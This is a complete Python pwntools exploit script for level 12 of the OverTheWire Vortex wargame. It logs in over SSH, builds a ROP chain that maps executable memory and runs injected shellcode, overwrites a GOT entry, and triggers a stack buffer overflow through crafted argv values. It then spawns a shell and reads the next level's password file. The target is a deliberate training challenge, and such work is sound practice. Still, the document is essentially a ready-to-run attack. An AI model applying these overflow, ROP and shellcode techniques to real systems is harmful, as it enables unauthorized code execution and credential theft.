#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn   import *
context(arch='i386',os='linux')
from pwnlib.constants import PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANON

level    = 12
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

#
# Helper script to make addresses and environment sane
# and consistent.
#
shell.set_working_directory()
shell.upload_file('r.sh')

#
# Binary and libraries
#
# Load the binary and all of its dependencies from the remote server
# and find their addresses.
#
elf  = ELF(chal)
libs = gdb.find_module_addresses(binary, ssh=shell)
libs += [elf]

for lib in libs:
    log.info("%#8x %s" % (lib.address, os.path.basename(lib.path)))

#
# Build our ROP stack with an extra RET at the beginning,
# in case we have to align up by four bytes because the
# address has a NUL byte in it.
#
rop   = ROP(libs)

rop.call(rop.ret[0])
rop.mmap(0xBAD0F00D, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0xffffffff, 0)
rop.read(0, 0xBAD0F00D, 0x1000, 0)
rop.call(0xBAD0F00D)

log.info("ROP Chain\n%s" % '\n'.join(rop.dump()))


#
# Encode
#
# Encode the ROP so that it's part of the argv[] array.
# See dump_args.sh for an example.
#
argv = []
arg  = ''
for byte in str(rop):
    arg += byte

    if byte == '\x00':
        argv.append(arg)
        arg = ''

argv_rop = ' '.join('$%r' % i for i in argv)

#
# Shellcode
#
# The actual shellcode that we send will swap out the GOT entry
# for sleep() as in challenge #8.
#
sc = asm(shellcraft.i386.pushstr(p32(elf.got['sleep'])))
sc += asm('''
pop eax

jmp GET_STAGE2
HAVE_STAGE2:
pop esi
mov [eax], esi

push SYS_exit
pop eax
int 0x80

GET_STAGE2:
call HAVE_STAGE2
''')
sc += asm(shellcraft.sh())

if '\xcc' in sc:
    log.warning("Shellcode has a breakpoint!")

#
# Overflow.
#
# If we just run with a cyclic, we crash with the following
# register context:
#
# Our target stack is in the arguments.
#
# EBP: 0x6b616169 (b'iaak')
# EIP: 0x6b61616a (b'jaak')
#
padsize        = cyclic_find('iaak')
argv_overflow  = cyclic(padsize)
argv_overflow += 'STAK'          # placeholder, resolved below
argv_overflow += p32(0x080485c1) # leave ; ret (mov esp, ebp; pop ebp; ret)

#
# Stack addresses
#
# We need to know the exact location of 'XYZ' on the stack in argv.
# This means that the exact same size-and-quantity of arguments must be
# used, as well as the same command line/argv[0].
#
def stack_hunter(commandline, where='_start'):
    cmd = "bash r.sh gdb --args %s" % (commandline)
    with shell.run(cmd) as gdb:
        gdb.send("""
set prompt
set disable-randomization off
set breakpoint pending on
break %s
run

python
sp       = int(gdb.parse_and_eval('(unsigned int) $sp'))
inferior = gdb.selected_inferior()
try:
    sp_base = sp
    while 1:
        inferior.read_memory(sp_base, 1)
        sp_base += 1
except:
    pass

n       = sp_base - sp
memory  = inferior.read_memory(sp,n)[:]
needle  = "XYZ\\x00".encode()
offset  = memory.find(needle)
end
""" % where)
        gdb.clean(2)
        gdb.send("""
python gdb.write("stack =%#x\\n" % sp)
python gdb.write("offset=%#x\\n" % offset)
python gdb.write("XYZ   =%#x\\n" % (sp+offset))
""")
        result = gdb.recvrepeat(2)
        gdb.send('kill')
        gdb.send('y')
        gdb.send('quit')
        gdb.close()
        return result


cmd = "%s $%r XYZ %s" % (binary, argv_overflow, argv_rop)
res = stack_hunter(cmd)
exec(res) # creates 'stack' and 'offset'
log.info("%#8x stack @ return"  % stack)
log.info("%#8x offset" % offset)

#
# Fix stack alignment, so that our ROP starts
# on a 16-byte boundary (though 8-byte is enough).
#
offset    = offset + 4     # Advance past 'XYZ\x00'
stack     = stack + offset # Find out what the stack pointer is for ROP
stackfix  = (stack % 0x10) # How much does it need to be realigned by
stack    -= stackfix       # Align down the stack
argv_rop += '@' * stackfix # Padding

log.info("%#8x stack (aligned)" % stack)

#
# Ensure there are no NUL bytes in the stack address itself,
# since it needs to survive the strcpy() when we blow away
# the return address.
#
# Since we have a big RETN sled at the beginning of our
# ROP, we have some wiggle room.
#
if stack % 0x100 == 0:
    stack += 4

#
# Patch the absolute address into our overflow
#
log.info("%x stack" % stack)
argv_overflow = argv_overflow.replace('STAK', p32(stack))


#
# Sploit
#
cmd     = "bash ./r.sh %s $%r XYZ %s" % (binary, argv_overflow, argv_rop)

sh = shell.run(cmd)
sh.sendline(sc)
sh.clean(2)

sh.sendline('id')
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile)
password = sh.recvline().strip()
log.success('Password: %s' % password)

print password
